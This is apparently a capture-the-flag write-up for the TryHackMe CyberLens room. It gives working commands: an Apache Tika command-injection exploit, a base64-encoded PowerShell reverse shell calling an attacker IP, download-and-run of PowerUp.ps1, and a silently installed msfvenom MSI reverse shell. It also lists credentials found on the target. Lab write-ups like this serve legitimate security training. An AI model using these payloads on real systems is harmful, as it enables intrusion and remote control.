# CyberLens

**Room Link:**  [https://tryhackme.com/r/room/cyberlensp6](https://tryhackme.com/r/room/cyberlensp6)

**Kali**

```
echo $VICTIM cyberlens.thm >> /etc/hosts
cat /etc/hosts
```

## **Scans** <a href="#scans" id="scans"></a>

Initial scan

**Kali**

```
nmap -A cyberlens.thm
```

<figure><img src="../../.gitbook/assets/image (1042).png" alt=""><figcaption></figcaption></figure>



Longer scan

**Kali**

```
nmap -sV -sT -O -p 1-65535 cyberlens.thm
```

<figure><img src="../../.gitbook/assets/image (1044).png" alt=""><figcaption></figcaption></figure>



## **TCP/80 - HTTP**

#### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
ffuf -u http://cyberlens.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```

<figure><img src="../../.gitbook/assets/image (1043).png" alt=""><figcaption></figcaption></figure>

## **TCP/61777 - HTTP**

#### Find Pages <a href="#find-pages" id="find-pages"></a>

**Kali**

```
ffuf -u http://cyberlens.thm:61777/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -fc 404,403 -e .php,.html,.txt
```

<figure><img src="../../.gitbook/assets/image (1048).png" alt=""><figcaption></figcaption></figure>

The other web server is running Tika 1.17 which has a command injection exploit.

<figure><img src="../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

## Initial Shell

**Kali**

```
searchsploit tika
searchsploit tika -m windows/remote/46540.py
```

<figure><img src="../../.gitbook/assets/image (1045).png" alt=""><figcaption></figcaption></figure>

**Kali #1**

```
python2 -m SimpleHTTPServer 82
```

**Kali #2**

```
python3 46540.py cyberlens.thm 61777 "curl http://10.10.178.238:82"
```

<figure><img src="../../.gitbook/assets/image (1046).png" alt=""><figcaption></figcaption></figure>

I tried to download multiple reverse shells but the problem seemed to be I couldn't save it anywhere so I did a base64 encoded PowerShell reverse shell.

**Kali #1**

```
rlwrap nc -lvnp 1337
```

**Kali #2**

```
python3 46540.py cyberlens.thm 61777 "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA3ADgALgAyADMAOAAiACwAMQAzADMANwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA="
```

<figure><img src="../../.gitbook/assets/image (1047).png" alt=""><figcaption></figcaption></figure>

## Web Access&#x20;

**Victim**

```
cd C:\Users\CyberLens\Documents\Management
type CyberLens-Management.txt
```

<figure><img src="../../.gitbook/assets/image (1049).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
remmina
Username: CyberLens
Password: HackSmarter123
```

<figure><img src="../../.gitbook/assets/image (1050).png" alt=""><figcaption></figcaption></figure>

## Privlege Escalation&#x20;

Load PowerUp.ps1 into memory.

**Kali**

```
wget https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1
python2 -m SimpleHTTPServer 82
```

Add the following line at the bottom to PowerUp.ps1 so it Invokes all checks automatically once downloaded

**PowerUp.ps1**

```
Invoke-AllChecks
```

**Victim(powershell)**

```
powershell -ep bypass
iex​(New-Object Net.WebClient).DownloadString('http://$KALI:82/PowerUp.ps1')
```

<figure><img src="../../.gitbook/assets/image (1051).png" alt=""><figcaption></figcaption></figure>

**Kali**

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1338 -f msi > shell.msi
```

**Kali**

```
rlwrap nc -lvnp 1338
```

**Victim(powershell)**

```
cd C:\temp\shell.msi
iwr -uri "http://$KALI:82/shell.msi" -o shell.msi
msiexec /quiet /qn /i C:\temp\shell.msi
```

<figure><img src="../../.gitbook/assets/image (1052).png" alt=""><figcaption></figcaption></figure>
